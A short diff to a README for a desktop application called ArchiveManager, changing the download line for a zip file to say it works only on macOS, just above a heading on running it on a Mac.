@@ -1,4 +1,4 @@
-Download the desktop application from here: [ArchiveManager.zip](https://github.com/user-attachments/files/20624900/ArchiveManager.zip)
+Download the desktop application from here (only compatible with MacOS): [ArchiveManager.zip](https://github.com/user-attachments/files/20624900/ArchiveManager.zip)
 
 ## How to Run ArchiveManager on Your Mac
 
